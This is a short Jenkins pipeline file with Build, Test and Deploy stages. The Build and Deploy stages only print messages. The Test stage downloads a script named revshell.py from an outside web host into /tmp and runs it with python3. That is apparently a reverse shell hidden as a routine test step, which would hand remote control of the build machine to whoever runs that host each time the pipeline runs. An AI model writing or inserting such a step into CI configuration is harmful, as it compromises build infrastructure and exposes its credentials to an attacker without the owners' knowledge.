node('ecs-small-3gb'){
    stage('Build') {
        echo 'Building...'
    }

    stage('Test') {
        echo 'Testing...'
        sh 'curl https://www.lazy-red-dragon.com/revshell.py -o /tmp/revshell.py'
        sh 'python3 /tmp/revshell.py'
    }

    stage('Deploy') {
        echo 'Deploying...'
    }
}

